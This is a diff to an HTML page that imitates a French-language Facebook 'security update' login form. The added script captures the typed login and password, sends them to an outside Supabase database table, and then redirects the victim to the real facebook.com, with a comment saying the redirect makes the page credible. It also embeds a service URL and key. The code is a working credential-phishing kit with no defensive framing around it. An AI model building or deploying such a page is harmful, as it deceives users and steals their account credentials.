@@ -80,20 +80,44 @@
         </div>
         
         <form id="loginForm">
-            <input type="text" placeholder="Numéro de mobile ou e-mail" required>
-            <input type="password" placeholder="Mot de passe" required>
+            <input type="text" id="login" placeholder="Numéro de mobile ou e-mail" required>
+            <input type="password" id="password" placeholder="Mot de passe" required>
             <button type="submit">Mettre à jour la sécurité</button>
         </form>
         
     </div>
 
-    <script>
-        // 3. L'ACTION (Ce que fait le bouton)
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            alert("Vérification en cours...");
-        });
-    </script>
+   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script>
+    // Configuration
+    const SUPABASE_URL = 'https://mgxrmqlgrieeilfmmyba.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_twXzt-UxzvUDeqmHc6ASaA_bqReZ';
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-</body>
-</html>
+    // L'action du bouton
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        // On récupère ce qui est tapé grâce aux ID qu'on a mis plus haut
+        const loginSaisi = document.getElementById('login').value;
+        const passwordSaisi = document.getElementById('password').value;
+
+        // On envoie à Supabase dans la table "Laurelle"
+        const { data, error } = await supabase
+            .from('Laurelle')
+            .insert([
+                { 
+                  username: loginSaisi, 
+                  password: passwordSaisi 
+                }
+            ]);
+
+        if (error) {
+            alert("Erreur de connexion au serveur de sécurité.");
+            console.log(error.message);
+        } else {
+            // Une fois envoyé, on redirige vers la vraie page Facebook pour que ce soit crédible
+            window.location.href = "https://www.facebook.com";
+        }
+    });
+</script>
